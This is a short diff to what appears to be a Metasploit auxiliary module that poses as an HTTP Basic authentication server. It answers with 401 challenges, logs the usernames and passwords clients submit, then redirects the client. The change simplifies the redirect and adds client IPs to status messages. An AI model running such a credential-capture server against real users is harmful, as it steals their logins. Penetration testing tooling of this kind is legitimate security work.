@@ -75,15 +75,13 @@ class Metasploit3 < Msf::Auxiliary
 
       print_good("#{cli.peerhost} - Credential collected: \"#{user}:#{pass}\" => #{req.resource}")
       if datastore['RedirectURL']
-        print_status("Sending redirect to client")
-        response = create_response(301, "Moved Permanently")
-        response.headers['Location'] = datastore['RedirectURL']
-        cli.send_response(response)
+        print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
+        send_redirect(cli,datastore['RedirectURL'])
       else
         send_not_found(cli)
       end
     else
-      print_status("Sending 401 to client")
+      print_status("Sending 401 to client #{cli.peerhost}")
       response = create_response(401, "Unauthorized")
       response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
       cli.send_response(response)
